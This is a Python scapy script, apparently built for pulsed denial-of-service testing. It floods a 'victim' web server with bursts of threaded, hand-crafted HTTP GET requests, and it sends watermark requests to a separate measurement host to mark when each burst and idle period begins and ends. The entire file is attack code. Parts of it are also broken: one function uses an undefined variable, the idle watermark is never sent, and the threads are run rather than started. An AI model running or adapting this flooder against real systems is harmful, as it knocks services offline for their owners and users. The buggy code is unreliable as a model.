from scapy.all import *
import time
import threading

measure=''
victim=''
port=8080

burst="""GET /json HTTP/1.1
 Host: %s
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20130501 Firefox/30.0 AppleWebKit/600.00 Chrome/30.0.0000.0 Trident/10.0 Safari/600.00
 Cookie: uid=12345678901234567890; __utma=1.1234567890.1234567890.1234567890.1234567890.12; wd=2560x1600
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Connection: keep-alive"""

watermark_burst="""GET /burst HTTP/1.1
 Host: %s
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20130501 Firefox/30.0 AppleWebKit/600.00 Chrome/30.0.0000.0 Trident/10.0 Safari/600.00
 Cookie: uid=12345678901234567890; __utma=1.1234567890.1234567890.1234567890.1234567890.12; wd=2560x1600
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Connection: keep-alive"""

watermark_idle="""GET /idle HTTP/1.1
 Host: %s
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20130501 Firefox/30.0 AppleWebKit/600.00 Chrome/30.0.0000.0 Trident/10.0 Safari/600.00
 Cookie: uid=12345678901234567890; __utma=1.1234567890.1234567890.1234567890.1234567890.12; wd=2560x1600
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Connection: keep-alive"""

###########################################
# generate a request
###########################################
def send_request(host,port,raw_payload):
	print("flooding")
	payload=raw_payload%(host)
	syn=IP(dst=host)/TCP(dport=port,flags='S')
	syn_ack = sr1(syn,verbose=0)
	request=IP(dst=host)/TCP(dport=port,sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack,ack=syn_ack[TCP].seq+1,flags='A')/payload
	send(request,verbose=0)
	return 0

###########################################
# generate burst for d seconds
###########################################
def sequence_on(p):
	end=time.time()+p

	# notify measurement process of the burst start
	send_request(measure,port,watermark_burst)
	
	# send bursts to victim, each burst lasts for p seconds
	while(time.time()<end):
		t=threading.Thread(target=timeout_worker,args=(send_request,{"host":victim,"port":port,"raw_payload":burst},end,'burst'))
		t.start()

	# notify measurement process that the burst is over
	send_request(measure,port,watermark_burst)
	print("iteration complete")
	
	# the burst is repeated after 10-p seconds
	time.sleep(10-p)
	
	# notify measurement process that the test iteration is over
	send_request(measure,port,watermark_burst)

###########################################
# idle for d seconds
###########################################
def sequence_off(p):
	
	# notify measurement process of the idle start
	send_request(measure,port,watermark)
	
	# do nothing
	time.sleep(p)
	
	# notify measurement process that the idle is over
	send_request(measure,port,watermark)
	
	# the burst is repeated after 10-p seconds
	time.sleep(10-p)

	# notify measurement process that the test iteration is over
	send_request(measure,port,watermark)

###########################################
# run till N seconds
###########################################
def timeout_worker(function,params,timeout,mode):
	while(time.time()<timeout):
		function(**params)
		if mode=='burst':
			continue
		else:
			break
	return 0

###########################################
# run sequences
###########################################
def run(p,d):
	end=time.time()+d
	t=threading.Thread(target=timeout_worker,args=(sequence_on,{"p":p},end,'burst'))
	t.run()
	end=time.time()+d
	t=threading.Thread(target=timeout_worker,args=(sequence_off,{"p":p},end,'burst'))
	t.run()

run(5,100)